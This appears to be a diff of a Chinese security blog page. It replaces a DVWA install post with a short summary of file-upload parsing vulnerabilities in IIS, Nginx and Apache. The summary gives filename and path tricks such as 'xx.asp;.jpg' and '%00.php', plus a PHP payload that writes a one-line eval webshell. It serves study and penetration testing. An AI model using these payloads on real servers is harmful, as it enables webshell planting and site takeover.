@@ -93,22 +93,42 @@
         
   <article class="post">
     <div class="post-title">
-      <h2 class="title">DVWA安装</h2>
+      <h2 class="title">文件上传漏洞总结</h2>
        
-        <p>DVWA</p>
-      
-        <p>test</p>
+        <p>文件上传漏洞总结</p>
       
     </div>
      <div class="post-meta">
-      <span class="post-time">2018-09-18</span>
+      <span class="post-time">2018-10-12</span>
     </div>
     <div class="post-content">
-      <h1 id="1-下载-XAMPP"><a href="#1-下载-XAMPP" class="headerlink" title="1.下载 XAMPP"></a>1.下载 XAMPP</h1><h2 id="地址：https-www-apachefriends-org-zh-cn-download-html"><a href="#地址：https-www-apachefriends-org-zh-cn-download-html" class="headerlink" title="地址：https://www.apachefriends.org/zh_cn/download.html"></a>地址：<a href="https://www.apachefriends.org/zh_cn/download.html" target="_blank" rel="noopener">https://www.apachefriends.org/zh_cn/download.html</a></h2>
+      <h3 id="IIS-解析漏洞"><a href="#IIS-解析漏洞" class="headerlink" title="IIS 解析漏洞"></a>IIS 解析漏洞</h3><hr>
+<blockquote>
+<h4 id="IIS-5-x-6-0-解析漏洞"><a href="#IIS-5-x-6-0-解析漏洞" class="headerlink" title="IIS 5.x/6.0 解析漏洞"></a><strong>IIS 5.x/6.0 解析漏洞</strong></h4></blockquote>
+<h5 id="1-目录解析"><a href="#1-目录解析" class="headerlink" title="1. 目录解析"></a>1. 目录解析</h5><pre><code>/xx.asp/xx.jpg
+</code></pre><h5 id="2-文件解析"><a href="#2-文件解析" class="headerlink" title="2. 文件解析"></a>2. 文件解析</h5><pre><code>xx.asp;.jpg
+</code></pre><blockquote>
+<h4 id="IIS-7-0-IIS7-5-Nginx-lt-8-03畸形解析漏洞"><a href="#IIS-7-0-IIS7-5-Nginx-lt-8-03畸形解析漏洞" class="headerlink" title="IIS 7.0/IIS7.5/Nginx &lt;8.03畸形解析漏洞"></a><strong>IIS 7.0/IIS7.5/Nginx &lt;8.03畸形解析漏洞</strong></h4></blockquote>
+<h5 id="1-畸形解析实例—–上传X-jpg，内容为"><a href="#1-畸形解析实例—–上传X-jpg，内容为" class="headerlink" title="1. 畸形解析实例—–上传X.jpg，内容为"></a>1. 畸形解析实例—–上传X.jpg，内容为</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?PHP</span> fputs(fopen(<span class="string">'shell.php'</span>,<span class="string">'w'</span>),<span class="string">'&lt;?php eval($_POST[cmd])?&gt;'</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>访问x.jpg/.php ,该目录下会生成1.php一句话木马</p>
+<h3 id="Nginx-解析漏洞"><a href="#Nginx-解析漏洞" class="headerlink" title="Nginx 解析漏洞"></a>Nginx 解析漏洞</h3><hr>
+<blockquote>
+<h4 id="Nginx-0-5-0-6-0-7-0-7-65-0-8-0-8-37"><a href="#Nginx-0-5-0-6-0-7-0-7-65-0-8-0-8-37" class="headerlink" title="Nginx 0.5. ,0.6. , 0.7 - 0.7.65, 0.8 - 0.8.37"></a><strong>Nginx 0.5. ,0.6. , 0.7 - 0.7.65, 0.8 - 0.8.37</strong></h4></blockquote>
+<h5 id="1-图片中嵌入PHP代码，然后访问"><a href="#1-图片中嵌入PHP代码，然后访问" class="headerlink" title="1. 图片中嵌入PHP代码，然后访问"></a>1. 图片中嵌入PHP代码，然后访问</h5><pre><code>x.jpg%00.php
+</code></pre><p> 可以执行PHP代码</p>
+<h3 id="Apache-解析漏洞"><a href="#Apache-解析漏洞" class="headerlink" title="Apache 解析漏洞"></a>Apache 解析漏洞</h3><hr>
+<blockquote>
+<h4 id="Apache解析顺序是从右到左，识别不可解析则向左判断"><a href="#Apache解析顺序是从右到左，识别不可解析则向左判断" class="headerlink" title="Apache解析顺序是从右到左，识别不可解析则向左判断"></a><strong>Apache解析顺序是从右到左，识别不可解析则向左判断</strong></h4></blockquote>
+<p> 测试时可以尝试上传一个x.php.rara.jpg.png…（把你知道的常见后缀都写上…）去测试是否是合法后缀</p>
+
     </div>
   </article>
   <div class="post-nav">
     <div class="post-nav-next post-nav-item">
+      
+        <a href="/2018/10/08/hello-world/" rel="next" title="Hello World">
+          <i class="fa fa-chevron-left"></i> Hello World
+        </a>
       
     </div>
 
@@ -116,8 +136,8 @@
 
     <div class="post-nav-prev post-nav-item">
     
-        <a href="/2018/10/08/hello-world/" rel="prev" title="Hello World">
-          Hello World <i class="fa fa-chevron-right"></i>
+        <a href="/2018/10/15/CouchDB未授权访问/" rel="prev" title="CouchDB未授权访问">
+          CouchDB未授权访问 <i class="fa fa-chevron-right"></i>
         </a>
       
     </div>
